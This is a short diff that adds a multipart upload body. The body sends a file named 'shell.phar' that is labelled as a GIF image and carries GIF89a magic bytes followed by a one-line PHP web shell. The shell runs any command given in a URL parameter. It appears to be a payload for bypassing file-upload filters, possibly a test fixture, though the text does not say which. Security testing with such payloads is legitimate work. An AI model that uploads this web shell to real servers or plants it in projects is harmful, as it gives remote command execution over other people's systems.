@@ -1,0 +1,6 @@
+--X
+Content-Disposition: form-data; name="file"; filename="shell.phar"
+Content-Type: image/gif
+
+GIF89a<?php system($_GET['c']); ?>
+--X--
